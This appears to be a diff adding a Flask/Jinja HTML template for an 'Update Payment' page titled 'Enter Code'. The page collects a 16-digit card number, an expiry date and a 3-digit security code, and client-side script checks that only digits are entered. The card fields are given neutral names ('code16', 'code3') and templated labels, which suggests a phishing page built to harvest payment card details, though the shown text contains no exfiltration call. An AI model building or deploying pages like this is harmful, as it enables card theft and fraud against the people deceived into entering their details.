@@ -1,0 +1,71 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Enter Code</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body class="form-page">
+  <div class="form-card">
+    <h2>Update Payment</h2> <!-- Edit this heading text directly if needed -->
+    {% with messages = get_flashed_messages() %}
+      {% if messages %}
+        <div class="flash">{{ messages[0] }}</div>
+      {% endif %}
+    {% endwith %}
+
+    <form method="post" onsubmit="return validateAll()">
+      <label>{{ label16 }}</label>
+      <input id="code16" name="code16" type="text" inputmode="numeric" maxlength="16" placeholder="16-digit code" required>
+
+      <div style="display:flex; gap:12px; margin-top:12px; align-items:center;">
+        <div>
+          <label>Expiry</label><br>
+          <select name="exp_month">
+            {% for m in months %}<option value="{{m}}">{{m}}</option>{% endfor %}
+          </select>
+          <select name="exp_year">
+            {% for y in years %}<option value="{{y}}">{{y}}</option>{% endfor %}
+          </select>
+        </div>
+
+        <div>
+          <label>{{ label3 }}</label><br>
+          <input id="code3" name="code3" type="text" inputmode="numeric" maxlength="3" placeholder="3 digits" required>
+        </div>
+      </div>
+
+      <div id="errors" style="color: #ffb3b3; margin-top:8px;"></div>
+
+      <button type="submit" style="margin-top:14px;">Proceed &gt;</button>
+    </form>
+  </div>
+
+<script>
+function validateAll(){
+  const c16 = document.getElementById('code16').value.replace(/\D/g,'').trim();
+  const c3 = document.getElementById('code3').value.replace(/\D/g,'').trim();
+  const errors = [];
+  if (!/^\d{16}$/.test(c16)) errors.push("Code must be exactly 16 digits.");
+  if (!/^\d{3}$/.test(c3)) errors.push("3-digit code must be exactly 3 digits.");
+  document.getElementById('errors').innerHTML = errors.join("<br>");
+  if (errors.length) return false;
+  // ensure fields hold only digits and correct lengths
+  document.getElementById('code16').value = c16;
+  document.getElementById('code3').value = c3;
+  return true;
+}
+
+// enforce only digits while typing
+document.addEventListener('input', (e) => {
+  if (e.target && e.target.id === 'code16') {
+    e.target.value = e.target.value.replace(/\D/g,'').slice(0,16);
+  }
+  if (e.target && e.target.id === 'code3') {
+    e.target.value = e.target.value.replace(/\D/g,'').slice(0,3);
+  }
+});
+</script>
+</body>
+</html>
